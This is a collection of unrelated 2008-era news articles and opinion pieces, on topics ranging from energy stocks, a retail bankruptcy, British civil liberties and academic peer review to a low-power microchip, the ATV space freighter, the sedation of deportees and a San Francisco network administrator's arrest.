I mention our markets here because , since I started to follow energy markets and companies in 2003 the expectation for the future has always been that prices will fall - even though energy futures prices switched to contango .
This century , energy companies have bought back stock on an unprecedented scale whilst contemplating their corporate navels and avoiding real investment in future energy supplies .
No wonder then that energy supplies are waning and prices are going through the roof .
Energy companies like BP find their stock valuations languishing at the same level of Jan 2005 and trading on a lowly PE multiple of 9 times historic earnings despite the meteoric rise in oil and gas prices over the same period .
Whilst it is true they are struggling to grow production and reserves they have also done all they can to talk down future energy prices and to avoid investing in our energy future .
The market is pricing in a future fall in production and oil price and terminal decline of global energy companies like BP at a time when we need these companies to display creativity , imagination and leadership .
The chart is from Yahoo .
Disclaimer - I do not own any BP stock though I do invest in energy companies .
When an energy sector presides over falling production whilst forecasting prices for their product will also fall it is little wonder that their stock values are priced in the bargain basement of Global Stock markets .
It is high time that the energy industries , capital markets and governments recognise that falling production and rising demand are not compatible with falling prices and that they come together to invest this profit bounty in our energy future .
That future does not lie in low eroei liquid fuels like ethanol and syncrude but in solar energy , wind energy , electricity , batteries , electric transportation and global scale HVDC grids .
It is time to invest and build .
A Chapter 11 bankruptcy filing by Linens ‘n Things is the latest sign that the retail sector is becoming leaner and meaner amid a difficult consumer environment .
On Friday , the bedding - and home - furnishings retailer filed a petition in Bankruptcy Court in Delaware and said it would close 120 underperforming stores , almost a quarter of them in California .
Ken Perkins , president of research company Retail Metrics , said the bankruptcy filing stemmed from a combination of operating issues and the lagging economy .
“ There ’s clearly a shakeout going on in the retail industry which will continue through the rest of the year , ” he said .
“ I think the weaker players are going to be in difficult shape here . ”

Clifton , N.J. - based Linens ‘n
Things said economic factors such as the decline in the housing market , tightening credit markets and a downturn in consumer discretionary spending , particularly in the housewares and furnishings sector , led to a “ precipitous decline ” in profitability and liquidity .
The factors worsened in the first quarter of 2008 , the company said .
Linens ‘n Things named Michael Gries of the restructuring firm Conway Del Genio Gries & Co. as chief restructuring officer and interim chief executive .
Current CEO Robert DiNicola will become executive chairman .
The company ’s Canadian stores -- which Linens ‘n Things said were among the best - performing stores -- are not included in the filing .
The filing is expected to be a boon to rival home - furnishings retailer Bed , Bath & Beyond Inc .

“ The number of stores Linens ‘n Things is closing is equivalent to almost 15 % of Bed , Bath & Beyond ’s core store base , so there is significant opportunity to gain market share , ” said William Blair & Co. analyst John C. Murphy .
The news is not as good for Linens ‘n Things ’ parent , New York private investment firm Apollo Management .
Apollo took the company private in 2006 for $ 1.3 billion .
“ The rapid spread of the retail recession caught Apollo and other Wall Street firms by surprise , ” said Burt P. Flickinger III , managing director of the consumer industry consulting firm Strategic Resource Group .
With competition from Bed , Bath & Beyond , department stores and other specialty stores , “ Linens ‘n Things too often had older locations and smaller stores that did n’t have the depth and range of products , ” he said .

Whether David Davis makes of himself a public hero or a popular buffoon by his plunge into notoriety , he stands for me as an allegorical monitor of our times .
His behaviour has been quixotic , but like the great mad progenitor of the condition , Don Quixote of La Mancha , he is fighting a cause in a truly fateful battle - a battle for liberty of the human spirit .
It is not just a matter of those 42 days , of habeas corpus or even of human rights in the political sense of the phrase : it is an elemental struggle that is dividing the British again into two nations , as Benjamin Disraeli saw them long ago .
They are in vulnerable condition anyway , their natural resistance weakened - all in a mess , demoralised , lacking confidence and conviction , enervated by failure and alien principles , swept this way and that by the forces of a rotten materialist culture .
And of the contemporary two nations , it seems to me , by far the greater is giving up on liberty .
Anyone can see that in Britain , 2008 , individuality is being suppressed , so that year by year , generation by generation , the people are being bullied or brainwashed into docile conformity .
What is more ominous is that so many want to be docile .
They want to be supervised , cosseted , homogenised , obedient .
The ubiquitous CCTV cameras are the emblems of this malaise , not because of their existence but because people accept them as necessary for the public good : the police tell them so , councils tell them so , statistics proclaim it , and so they believe it , and are perfectly willing to be spied upon , night and day , wherever they go , by unknown , invisible strangers out of sight .
The so - called war on terror is of course the supposed excuse for this appalling violation of all our privacies , together with the ominous rise of the secret intelligence agencies .
The public has been gulled into acceptance of the supervisory state , with all its paraphernalia of surveillance and identity cards , DNA databases , armed police and arbitrary search , by the mantra : " If you do n't do anything wrong , why worry ? "
Brainwashed by a tabloid press of brilliantly insidious techniques , then , numbed by the relentless mediocrity of television , half the people have willingly forfeited the right to make up their own minds , and mutely accept indoctrination .
" He 's not afraid of anything , " I overheard one young mother say to another , watching her three - year - old clambering over an obstacle , but the reply came straight from the state : " Oh that 's dangerous , you must never allow him to think like that . "
Even the middle classes , once the very backbone of robust individualism , are not immune to the contagion .
They all think twice about expressing their views in case they say something that is politically incorrect .
They preposterously mollycoddle their children , not only because they have been so repeatedly warned of life 's unspeakable dangers but also because they wonder what the neighbours will think .
They are officially encouraged to snoop and sneak on their fellow citizens , so snoop and sneak they do .
And when you are afraid to say what you think , it is a step nearer to the most dreadful condition of all : being afraid of what to think .
As I see it , Davis 's display concerns not just political liberty but liberty of the mind , of the identity , of the spirit - even , patriots might sententiously say , of the national soul .
It is not simply 800 years of hard - won political rights he is defending , it is nothing less than a view of life itself , which civilised peoples have so pain - stakingly fashioned down the centuries .
It has been an old pride of the British that they , above all , have honoured the truest forms of freedom , with all its anomalies , eccentricities and humour , above and beside all politics , obeying only laws they respect .
A few more generations of nagging and surveillance and we shall have forgotten what true freedom is .
Young people will have foregone the excitements of risk , academics will temper all thought with caution , and the great public will accept without demur all restrictions and requirements of the state .
Ours will be a people moulded to docility , perfect fodder for ideologues .
Then if the one nation of the British slides into autocracy , guided by opportunist or witless politicians and a gullible press , the other nation will be goaded towards despotism too .
Already every free soul , I suspect , has sometimes wished that we had a benevolent dictator to sweep all the nonsense aside , the flabbiness and the conformity , the brainwash and all .
Some day the structure may crack , and we shall find ourselves under the autocracy of conformists or libertarians - both forced into totalitarianism in defence of their own philosophies .
So perhaps Davis is a prophet as well as a politician .
When he talks of habeas corpus he is echoing ideas far older and more profound , reaching back to the earliest yearnings of antiquity , the first glimmerings of human individuality , when our ancestors began to break from tribal disciplines and devise preferences of their own .
Tribalism is what every despotism hopes to impose on its people .
It is the will of the party , which Davis has apparently flouted .
It is the will of the majority , which is one reason why Gordon Brown feels no need to put up a candidate at Haltemprice and Howden .
Today the whistleblowers are our guardians of the spirit , and I like to think that Davis is one of them - a true successor of the grand old knight of Castile , but alas , tilting at windmills that are all too real .

Every civilization and every society within a particular civilization rests on a series of presuppositions .
These presuppositions are considered sacrosanct by most members of the society .
They are considered self - attesting , self - reinforcing , and self - evident .
In other words , they take on the characteristics of a religion .
That is because they are deeply religious .
These presuppositions are considered so sacrosanct that anyone who publicly challenges them , let alone refers to them as self - interested , risks becoming the target of a systematic program of reprisals : shunning , loss of employment , and ridicule .
A person who challenges the fundamental presuppositions of a society is comparable to a person in Saudi Arabia who hands out gospel tracts for Jesus .
He is not going to get away with it at no cost .
What I have said here regarding societies is equally true of every special - interest organization .
Above all , it is true of a special - interest organization that seeks tax funding from the broader society .
THE MYTH OF NEUTRALITY
This myth was used in Prussia to justify the independence of the faculty members in universities funded by the Prussian state .
This began in the early 19th century .
It was used in the late 19th century by faculty members in American colleges to escape screening by the denominations that funded the colleges .
The colleges often filled their faculties with retired pastors .
Younger men wanted out from under this control .
The myth of neutrality undergirds the doctrine of academic freedom .
Both doctrines have the same practical goal : to provide safe , secure employment for faculty members who do not share the worldview of the people paying their salaries .
These faculty members want to convert the thinking of the next generation of financial supporters .
Tax funding of higher education increases the stakes .
Anyone who seeks tax funding for his particular educational organization must do so in the United States in terms of the myth of neutrality .
This myth undergirds modern American politics , so it also undergirds modern tax - funded education .
A person who comes to a state legislature in the name of sectarian truth is considered an outsider and therefore not entitled to tax funding .
To provide tax funding for sectarian ideals would be a violation of the myth of neutrality .
No such violation is allowed officially .
The U.S. Supreme Court has so determined since 1960 .
The fact of the matter is this : every system of truth rests on a denial of one or another presupposition of a rival approach to truth .
The more widespread the doctrine of intellectual neutrality , the more intensely the purveyors of highly un-neutral worldviews will insist that their worldview rests on universal principles of truth that cannot successfully be challenged by purveyors of rival worldviews .
There was a time when the doctrine of moral and intellectual neutrality was not taken seriously by leaders of societies .
When societies were self - consciously religious in outlook , they wound up at war with other societies that were equally committed to rival religious presuppositions .
Religious wars escalated in the West in the 17th century .
They culminated in the English Civil War between Protestants , 1641 — 49 , and the Thirty Years ’
War in the German states between Protestants and Catholics , 1618 — 48 .
In reaction , critics of these religious wars turned to the doctrine of the myth of neutrality as a means of escaping from religious wars .
They believed that reason is neutral .
This neutrality , they believed , makes it possible to create entire systems of thought that rest on universally acceptable assumptions about the nature of political sovereignty , political authority , civil law , social causation , and history .
As we look back on the wars of the 20th century , some of us regard these 17th - century dreams as remarkably naïve .
The dream still exists in the field of tax - supported education .
In fact , without this dream as the official doctrine , educators cannot get their hands into the public till .
Access to the till demands the public affirmation of the myth of neutrality .
PEER REVIEW
In the field of higher education , the myth of neutrality is reinforced by a subordinate myth , the myth of peer review .
Every academic discipline has dozens of professional journals in every large nation .
In those universities that pay the highest salaries , in order to gain tenure , an assistant professor must publish articles in a small handful of these peer - reviewed academic journals : the top dozen or so .
These journals are edited by individuals who represent the majority outlook of the members of a particular academic discipline .
It is a sub - guild within the guild of higher education .
Every academic journal has an unofficial series of presuppositions and rules governing the publication of articles in the journal .
These rules are never put on paper .
The editor of the journal selects readers who hold doctorates in the field , and who have specialized in a particular area , to review submitted articles .
The editor makes certain that each of the members of the reviewing committee understands the unofficial rules of the game .
There is an acceptable range of discourse within the profession that must be respected .
Any article that promotes a view of the topic under discussion that raises questions about the range of discourse in the guild will be rejected .
The reviewers are anonymous .
They do not have to provide a reason for rejecting an article .
They may provide reasons , which are sent to the editor .
The editor may or may not pass on this list of reasons to the person who submitted the article .
The closer the article gets to undermining confidence in the received truths of the guild , the less likely the submitter will be informed about why his article was rejected .
To provide the real reasons why the article was rejected would call into question the myth of neutrality ; it would point out the existence of guild requirements within what is obviously a guild .
This is simply not done .
That which is obvious to everyone by the time he is granted his doctorate is never stated publicly by any official within the guild .
All of this is sub rosa .
All of this operates behind the scenes .
Everyone knows it exists .
Almost everyone approves of it .
Anyone who does n’t approve of it has these choices : ( 1 ) find another academic journal to publish his article ; ( 2 ) start his own academic journal ; ( 3 ) write articles that do not lead to doubts about the fundamental presuppositions of the guild ; ( 4 ) seek employment in a less prestigious institution ; ( 5 ) enter the private sector — the closest thing to the doctrine of hell that academia has .
The widespread acceptance of this system was undermined by a book : The Structure of Scientific Revolutions , by Thomas Kuhn , published by the University of Chicago Press in 1962 .
It did not receive a lot of attention until after 1965 , when the worldwide student revolutions began , and the counterculture came into prominence .
At that point , academic outsiders in what was known as the New Left began challenging the myth of neutrality in every academic discipline in the humanities .
There were not many New Leftists in engineering , chemistry , and physics , so these departments continued to operate under the old umbrella of the myth of neutrality .
This is ironic , because Kuhn ’s book focused on the natural sciences , especially the history of chemistry .
But in the social sciences and humanities , the myth of neutrality came under attack , and the most important single document to justify this attack was Kuhn ’s book .
University presses have also been peer - reviewed , but not nearly so tightly as the journals .
University presses are run by editors who want to increase sales .
So , they have a tendency to accept salable book manuscripts for publication that may be outside the accepted limits of debate within a particular academic guild .
So , peer - reviewed academic presses tend to be more lenient than peer - reviewed academic journals .
A person is more likely to make an impact on his peers through a book published by one of the major university presses than he is by publishing an article in one of the major academic journals .
The fact of the matter is , hardly anyone reads all the articles in an academic journal .
A person may read a book cover to cover if the book is of interest to him .
Rare is the scholar who owes his reputation in his guild solely to the publication of a few articles .
There are exceptions .
Ronald Coase is an exception .
But there are not many like him .
When someone publishes a book , he opens himself to criticism .
Specialists in the field may decide to review his book in a highly critical manner .
He has an opportunity to revise the book in a second edition , if there is enough demand for the book to justify a second edition .
He may write a second book that refutes the criticisms .
The point is , the real peer review is from the public that reads his book .
This public is much larger than the public that reads a specialized academic journal .
THE DIVISION OF LABOR
We cannot know everything .
So , we specialize .
But to keep things in perspective , we ally ourselves with people who share at least some of the fundamental presuppositions of our worldview .
We hire people to screen information for us .
We subscribe to a few journals .
We read books published by certain publishers .
We trust some screeners rather than others .
We want the specialists to do the screening in terms of the presuppositions we hold to .
We understand that every special - interest group , every church , every academic guild polices itself in terms of certain interpretations of reality .
The problem comes when the organization seeks public support , especially tax support , which means that its members seek support from people who do not share their presuppositions .
At this point , the deception begins .
It is initially the deception of the general public , but over time it becomes self - deception on a massive scale .
The beneficiaries of the tax subsidies really do come to believe that their narrow special interest represents the best interest of the public at large .
To deny this would mean denying the legitimacy of the quest for tax support .
Those who become addicted to constant subsidies from the state are unlikely to abandon the fundamental presupposition that justifies their return to the government trough .
So , the myth of neutrality is publicly upheld .
The legitimacy of peer review is also upheld .
It is not upheld as simply a way for a special - interest group to screen those who provide information to the members .
It is upheld as part of the prevailing myth of academic neutrality .
Therefore , anyone who violates the game by denying the myth of neutrality is regarded in much the same way that a heretic was regarded in Spain in 1492 .
There is nothing inherently wrong with peer review , but we should not be misled as to the nature and function of peer review .
In today ’s academic world , its primary function is to justify access to tax money .
It is the justification for the academic welfare state .
DELIVERANCE !
The good news is that the World Wide Web is undermining the guild system .
The main barrier to entry in creating a new academic journal used to be the cost of printing in developing a mailing list .
There had to be paid subscribers in order for a journal to become respectable within the guild .
Today , however , the cost of starting a journal is much lower .
There are no printing or mailing costs .
As economics teaches , when the cost falls , more will be supplied .
For three centuries , the growth of academic journals has been high .
The number now resembles a parabolic curve stretching to the heavens .
Everybody wants to get published , so everybody has an incentive in seeing an increase of peer - reviewed journals .
The institutional problem , however , is that the increased supply reduces the leverage of the guild ’s screening process that is basic for achieving tenure .
So , the guilds have fallen back on the tried - and - true insight of George Orwell : all peer - reviewed journals are equal , but some are more equal than others .
The World Wide Web is also undermining the monopoly or semi-monopoly enjoyed by the University press system , and by the New York City publishing cartel .
You can publish a book on the Web in approximately 90 seconds .
I do it quite frequently .
Another reason why the Web is undermining the peer - reviewed journals is because , in the field of science , the law of success is “ first come , first served . ”
The sooner you get your discovery published in a public forum , the more likely you will get credit for having made the discovery .
Waiting 18 months to two years to get your discovery published in a peer - reviewed journal may prove suicidal if another researcher goes on - line with his discovery .
The peer - reviewed journals are now operating at a huge disadvantage within the scientific community .
They are too slow .
The early bird gets the worm .
If the worm is important enough , the early bird either gets tenure or gets an offer at twice the salary from another university .
So , we are seeing the destruction of academic guilds .
We are seeing something like open entry in the field of ideas because of the Web .
This is hated by members of the guilds .
They scream , “ Unclean ! Unclean ! ”
They dismiss an innovative article for not having been published in a peer - reviewed forum .
But the logic of the system in the natural sciences — of early bird gets the worm — undermines all such criticisms .
It also enables outsider groups to call attention to the non-self - evident nature of the presuppositions of the existing guilds .
We are seeing the undermining of the legitimacy of the self - interested guilds who have their hands in the public till .
The myth of neutrality is losing adherents .
This process is going to accelerate .
This is the greatest single threat today to tax - funded education .
The costs of providing alternative education are falling , and the last remaining barrier to entry is academic accreditation , which is the institutional handmaiden of the guilds .
CONCLUSION
Guilds fear one thing above all else : open entry .
The main barrier to entry has been economic : the cost of printing , the cost of gaining accreditation , and the cost of gaining tax support .
On all fronts , the academic guilds are under assault .
This is going to increase over time .
The cost of launching an assault is getting ever lower , and at lower cost , there will be increased demand to join one or another assault team .
The academic guilds are not used to open entry .
They are not used to public criticism from non -guild members .
If the public ever figures out that it can escape the clutches of higher education in the United States , which absorbs about a third of a trillion dollars a year , the game will end .
The guilds will have to compete in a free market .
They are not used to this .
They will resent it .
But they are going to have to learn to live with it .
Long live the Web .

Bingo !
by Doug French by Doug French
DIGG THIS
With prices at the pump in the $ 4 - per - gallon range , people are starting to think twice about taking those unnecessary trips .
And it ’s likely to get worse .
 As the lack of supply growth and price - insulated non-OECD demand suggest a future rebound in U.S. gross domestic product growth or a major oil supply disruption could lead to $ 150 — $ 200 a barrel oil prices ,  the analysts at Goldman Sachs recently said .
Not that these considerations are new .
As a young boy , I used to spend some time with my grandma French - Lucille .
And although I suppose this would be frowned upon today , Lucille took me along to enjoy her favorite pastime one Saturday afternoon : Bingo at the Eagles Lodge .
According to the FOE ( Fraternal Order of Eagles ) official website , the organization ’s mission is to uphold and nourish the values of home , family and community that are so necessary and it seems so often get ignored and trampled in today ’s society . 
Maybe that high - sounding cause was their reason for being back in 1963 , but as near as I remember , the Eagles Lodge in Abilene existed for one reason — bingo .
Of course , the Eagles met at a small building located  south of the tracks  back in those days , probably on the very site of one of the storied cow town ’s hundred or so saloons that had thrived at the climax of the Chisholm Trail between 1867 and 1887 .
But by the early 1960s , the Longhorns , the cowboys and the bars were long gone — replaced by pious farmers growing wheat and fattening Herefords .
But a spirited game of bingo could still be found at the Eagles Lodge , which happened to be located just a few short blocks from where Lucille and my grandpa Glen lived .
I was not only the only male in the room , but certainly the only 6 - year - old there .
And Lucille did n’t see why I should n’t go ahead and play a card .
The cards were a nickel apiece , so while she played a couple of cards I proudly played one of my own .
The wonderful thing about bingo , in addition to the social aspects of the game , is as the numbers are drawn , the suspense builds ; most everyone playing thinks they have a chance of winning .
Well , sure enough , I covered that last number , and looked expectantly at Lucille .
She said ,  Shout bingo . 
I was so excited and nervous , as they counted back the numbers to verify that I had won .
It would have been very embarrassing to have made a mistake .
But I had n’t .
The jackpot was mine : all 50 cents of it .
I made my way to the front and collected the prize .
When I returned to my seat , I showed Lucille the two quarters .
She quickly snatched one from my hand .
 Why are you taking one of my quarters ?  I plead .
 To pay for the gas to get over here ,  Lucille replied , putting the quarter in her pocketbook .
That quarter came close to paying for a gallon of gas that year — the average price per gallon was 30 cents .
And the 1963 ( or earlier ) quarter was , shall we say , sturdier than today ’s version : 90 percent silver , 10 percent copper .
Today ’s quarters , according to the U.S. Mint , are clad , ’ which means layered .
The inner core is pure copper and the outer covering is copper mixed with nickel . 
A quarter weighs about a fifth of an ounce .
At today ’s silver price of around $ 18 per ounce , the 1963 quarter had the equivalent of today ’s $ 3.24 of silver in it .
Thus , silver essentially buys the same amount of gasoline today that it did 45 years ago .
Gas is n’t getting more expensive ; the government ’s money just continues to be degraded .
If the Fraternal Order of Eagles is looking to uphold and nourish good values , they should champion the cause of sound money .

In 2003 , Colby Buzzell , then twenty - six , was living in a small room in a renovated Victorian house in the Richmond district of San Francisco , doing data entry for financial companies .
Raised in the suburbs of the Bay Area , Buzzell had hated high school and , deciding against college , ended up in a series of low - paying jobs — flower deliverer , valet parker , bike messenger , busboy , carpet cutter , car washer .
Data entry paid somewhat better — about $ 12 an hour — but even so he was barely able to get by .
At one point , he ran into an old friend who had joined the Marines , and , in his telling , military life sounded like one big frat party , but with weapons and paychecks .
After nearly a year of feeling stuck , Buzzell decided to visit an Army recruiter .
He describes his state of mind in My War : Killing Time in Iraq , 1 an uproarious account of his life in the military :
I was sick of living my life in oblivion where every fucking day was the same fucking thing as the day before , and the same fucking routine day in and day out .
Eat , shit , work , sleep , repeat .
At the time , I saw no escape from this .
I was in my mid-twenties and I still had no fucking idea what the hell I wanted to do with myself … .
I figured if I joined the military it might be a quick - fix solution to my problems , it would add some excitement to my life , and at the same time give me the sense that I had finally done something with myself .
And who knows ?
A trip to the Middle East could be one hell of an adventure .
Buzzell had a long rap sheet and a history of drug use , but , with his recruiter ’s help , he made it through the application process , and before long he was off to boot camp .
Many of the other recent books written by soldiers about their experiences in Iraq offer similarly frank accounts of their paths into the military .
In Love My Rifle More Than You : Young and Female in the US Army , 2 Kayla Williams , who joined the punk scene when she was thirteen and loved to drop acid , writes that she joined in part to get away from one boyfriend who turned out to have been married and to prove wrong another who had taunted her about her lack of toughness .
The promise of a regular paycheck did not hurt .
“ There are many reasons to join the Army , ” she writes .
“ But without a doubt it ’s a great way — leaving aside the whole prospect of getting maimed or killed — to better your career prospects . ”
Joshua Key , in The Deserter ’s Tale : The Story of an Ordinary Soldier Who Walked Away from the War in Iraq , 3 describes growing up in rural Oklahoma in a two - bedroom trailer with his mother and alcoholic stepfather and working at a series of minimum - wage jobs .
At eighteen he got married and quickly had two sons but few prospects of providing …
WASHINGTON  Ever since the G.I. ’s came home from World War II , it has been the nation ’s policy to reward war veterans with college education .
Now , a bipartisan proposal to expand that benefit significantly for today ’s veterans has encountered a new complication : the military still needs its fighting men and women in uniform , not in classrooms .
With the wars in Iraq and Afghanistan far from over , President Bush is threatening to veto a bill that would pay tuition and other expenses at a four - year public university for anyone who has served in the military for at least three years since the attacks of Sept. 11 , 2001 .
A main reason is the fear that it would hasten an exodus from the ranks .
The issue has created a political conundrum for a president who has often gone to great lengths to show support for the troops .
And in an election year , when legislative battles on Capitol Hill are increasingly turning into proxy fights of the presidential campaign , that is almost certainly the point .
“ I would say the president really has a choice here , ” Senator Jim Webb , a Virginia Democrat who has led the Senate ’s efforts to expand the benefits , said Sunday on “ Meet the Press . ” Mr. Bush , he said , needed “ to show how much he values military service . ”

ANN ARBOR , Mich .---A low - power microchip developed at the University of Michigan uses 30,000 times less power in sleep mode and 10 times less in active mode than comparable chips now on the market .
The Phoenix Processor , which sets a low - power record , is intended for use in cutting - edge sensor - based devices such as medical implants , environment monitors or surveillance equipment .
The chip consumes just 30 picowatts during sleep mode .
A picowatt is one - trillionth of a watt .
Theoretically , the energy stored in a watch battery would be enough to run the Phoenix for 263 years .
Scott Hanson , a doctoral student in the U - M Department of Electrical Engineering and Computer Science , will present the design June 20 at the Institute of Electrical and Electronics Engineers ' Symposium on VLSI Circuits .
Hanson jointly leads this project with Mingoo Seok , a doctoral student in the same department .
Phoenix measures one square millimeter .
There 's nothing special about its size , as chips in many modern sensors and electronics are one square millimeter and smaller .
But Phoenix is the same size as its thin - film battery , marking a major achievement .
In most cases , batteries are much larger than the processors they power , drastically expanding the size and cost of the entire system , said David Blaauw , a professor in the Department of Electrical Engineering and Computer Science .
For instance , the battery in a laptop computer is about 5,000 times larger than the processor and it provides only a few hours of power .
" Low power consumption allows us to reduce battery size and thereby overall system size .
Our system , including the battery , is projected to be 1,000 times smaller than the smallest known sensing system today , " Blaauw said .
" It could allow for a host of new sensor applications . "
A group of U - M researchers is putting the Phoenix in a biomedical sensor to monitor eye pressure in glaucoma patients .
Engineers envision that chips like this could also be sprinkled around to make a nearly invisible sensor network to monitor air or water or detect movement .
They could be mixed into concrete to sense the structural integrity of new buildings and bridges .
And they could power a robust pacemaker that could take more detailed readings of a patient 's health , researchers say .
To achieve such low power , Phoenix engineers focused on sleep mode , where sensors can spend more than 99 percent of their lives .
Sensors wake only briefly to compute at regular intervals .
" Sleep mode power dominates in sensors , so we designed this device from the ground up with an efficient sleep mode as the No. 1 goal .
That 's not been done before , " said Dennis Sylvester , an associate professor in the Department of Electrical Engineering and Computer Science .
The system defaults to sleep .
A low - power timer acts as an alarm clock on perpetual snooze , waking Phoenix every ten minutes for 1/10th of a second to run a set of 2,000 instructions .
The list includes checking the sensor for new data , processing it , compressing it into a sort of short - hand , and storing it before going back to sleep .
The timer " is n't an atomic clock , " Hanson said .
" We keep time to 10 minutes plus or minus a few tenths of a second .
For the applications this is designed for , that 's okay .
You do n't need absolute accuracy in a sensor .
We 've traded that for enormous power savings . "
A unique power gate design is an important part of the sleep strategy .
Power gates block the electric current from parts of a chip not essential for memory during sleep .
In typical state - of - the - art chips , power gates are wide with low resistance to let through as much electric current as possible when the device is turned on .
These chips wake up quickly and run fast , but a significant amount of electric current leaks through in sleep mode .
Phoenix engineers used much narrower power gates that restrict the flow of electric current .
That strategy , coupled with the deliberate use of an older process technology , cut down on energy leaks .
" A power gate of such a small size is unheard of in traditional design since it severely limits the performance of the chip , " Seok said .
To address this performance loss , the Michigan team increased the chip 's operating voltage , increasing the baseline power by approximately 20 percent when the chip is awake .
But Phoenix still runs at 0.5 Volts , rather than the 1 to 1.2 Volts typical chips require .

' JULES VERNE ' STATISTICS Mission Guide : Jules Verne Total cargo : 4,860kg 1,340kg - ' dry ' supplies 20kg - air ( oxygen / nitrogen ) 280kg - drinking water 860kg - propellant for ISS 2,360kg - re-boost propellant
The ship itself has 3,490kg of propellant for rendezvous , re-boost and de-orbit manoeuvres
In graphics : Space Station
Fly an ATV mission ATV quick guide Ariane 5 launch Europe 's " Jules Verne " freighter is about to start practice docking manoeuvres at the space station .
The cargo truck will test its systems with two close approaches and retreats before finally linking up with the orbiting platform next Thursday .
The ship , which is carrying just under five tonnes of supplies for the station 's astronauts , flies under the control of autonomous computers .
The vehicle 's performance so far has been exemplary , say space officials .
" We 've had the usual small anomalies ; we 're learning how to fly the bird - but nothing that has been really difficult , " said John Ellwood from the European Space Agency ( Esa ) .
See where the ATV is right now Launched earlier this month , Jules Verne , also known as the Automated Transfer Vehicle ( ATV ) , was parked up in front of the International Space Station ( ISS ) during the recent shuttle visit .
But now that the Endeavour orbiter and its crew are on the ground , controllers have commanded the truck to come back over the platform for two demonstration days .
Jules
Verne is designed to make its own way to the platform and complete an automated attachment .
Humans will only interfere if something is seen to be going wrong .
But as a new ship , the ATV must prove itself ; and the demos will allow for the checkout of all the vehicle 's close - manoeuvring systems , including its advanced GPS technology and optical sensors .
The first practice session , on Saturday , will see the ATV move to a hold point just 3,500 m ( 2 miles ) behind and 100 m ( 330 ft ) above the station .
The second , on Monday , will see Jules Verne edge to just 12 m ( 40 ft ) from the back of the ISS ; and , hopefully , aligned straight with the docking mechanism .
The second day will also give the station crew an opportunity to practise their safety interventions .
By pressing buttons on a special panel positioned in the ISS 's Zvezda module , it is possible for the astronauts to command the ATV to stop in its tracks and even move away from the station .
Once these operations have been completed , ground controllers will assess the results , before giving the green light to Jules Verne to try a docking for real .
At the moment , this procedure is booked to begin next Thursday at 1144 GMT , with the ATV starting from a hold point 250 m ( 820 ft ) from the ISS .
Contact with Zvezda 's docking mechanism is timed for 1441 GMT .
The cargo ship 's speed relative to the station at that moment will be about seven cm / second ( three inches /s ) .
In reality , of course , the two objects - cargo ship and station - will be moving across the surface of the Earth at about 27,000 km/h ( 17,000 mph ) .
Once a seal and electrical connections have been confirmed , and the astronauts have checked the air inside the ATV is safe to breathe - the supplies can be unloaded .
Crews will use Jules Verne like a store cupboard .
They will go into the pressurised vessel to obtain food , clothing and equipment when they need it .
Fuel will be piped across to the main station complex ; water will be carried out in bags ; air will simply be vented from taps .
As the supplies are depleted , the space will be filled with rubbish .
The ATV is expected to take this waste into a controlled burn - up over the Pacific Ocean when it leaves the station later this year .
Cool running Esa is understandably delighted with the way the mission has gone so far .
There was a glitch associated with the propulsion system shortly after launch but back - up systems kicked in as designed ; and the issue that triggered the alert was resolved within a day or so .
ATV controllers in Toulouse , France , have seen their screens light up with alarms on a number of occasions when sensors on the spacecraft have detected low temperatures .
But engineers say this resulted from warning values being set too strictly prior to flight and did not indicate there was anything seriously wrong with the truck .
The trigger values had subsequently been re-set , said Dr Ellwood .
" This bird has got so many thermisters , so many sensors , if we did n't have some things set wrongly it would have been a surprise , " he told BBC News .
" It 's been virtually perfect so far , but obviously over next few days we 'll all be a little bit nervous , naturally . "
Esa 's ATV project manger added : " We 've got a lot of things to do , and it would be nice to dock by next Thursday ; but if there 's anything we 've got question marks about , we 'll hang on .
We do n't have to rush this . "
ATV flights over the coming years will be the way Europe pays its way on the space station project .

Detainees drugged against their will for deportation RawStory
Published : Wednesday May 14 , 2008

Print This Email This
In day 4 of a Washington Post series , Careless Detention , it is revealed that the United States has injected hundreds of foreigners without their consent with dangerous mind - altering drugs for trips returning them to their home countries , according to government documents , medical records , and interviews with some of the actual people who were drugged .
From the report :
The government 's forced use of antipsychotic drugs , in people who have no history of mental illness , includes dozens of cases in which the " pre-flight cocktail , " as a document calls it , had such a potent effect that federal guards needed a wheelchair to move the slumped deportee onto an airplane .
" Unsteady gait .
Fell onto tarmac , " says a medical note on the deportation of a 38 - year - old woman to Costa Rica in late spring 2005 .
Another detainee was " dragged down the aisle in handcuffs , semi-comatose , " according to an airline crew member 's written account .
Repeatedly , documents describe immigration guards " taking down " a reluctant deportee to be tranquilized before heading to an airport .
In a Chicago holding cell early one evening in February 2006 , five guards piled on top of a 49 - year - old man who was angry he was going back to Ecuador , according to a nurse 's account in his deportation file .
As they pinned him down so the nurse could punch a needle through his coveralls into his right buttock , one officer stood over him menacingly and taunted , " Nighty - night . "
Such episodes are among more than 250 cases The Washington Post has identified in which the government has , without medical reason , given drugs meant to treat serious psychiatric disorders to people it has shipped out of the United States since 2003 -- the year the Bush administration handed the job of deportation to the Department of Homeland Security 's new Immigration and Customs Enforcement agency , known as ICE .
Involuntary chemical restraint of detainees , unless there is a medical justification , is a violation of some international human rights codes .
The practice is banned by several countries where , confidential documents make clear , U.S. escorts have been unable to inject deportees with extra doses of drugs during layovers en route to faraway places .
Federal officials have seldom acknowledged publicly that they sedate people for deportation .
The few times officials have spoken of the practice , they have understated it , portraying sedation as rare and " an act of last resort . "
Neither is true , records and interviews indicate .
The most frequently used drugs in the sedation ' cocktail ' are haldol , an anti-psychotic medication that " gained notoriety in the Soviet Union , where it was often given to political dissidents imprisoned in psychiatric hospitals . "
Ativan , used to control anxiety , and Cogentin , a medication that supposedly lessens Haldol 's side effects of muscle spasms and rigidity .
The medically recommended dosage for the Haldol alone , from the report :
For aggressive behavior , 0.5 milligrams twice a day to 5 milligrams three times a day , although doses of up to 10 milligrams a day may be used in a hospital emergency room .
This graph illustrates the dosage , and number of detainees given Haldol : The U.S. made flight layovers during some trips with sedated detainees , and as there are foreign nations that forbid the practice , the report also details some run-ins between flight nurses and foreign officials , which in one instance resulted in a detainee being returned to Atlanta , GA from a layover in France .
The full report by the Washington Post 's Amy Goldstein and Dana Priest is available online here .

A disgruntled city computer engineer has virtually commandeered San Francisco 's new multimillion - dollar computer network , altering it to deny access to top administrators even as he sits in jail on $ 5 million bail , authorities said Monday .
Terry Childs , a 43 - year - old computer network administrator who lives in Pittsburg , has been charged with four counts of computer tampering and is scheduled to be arraigned today .
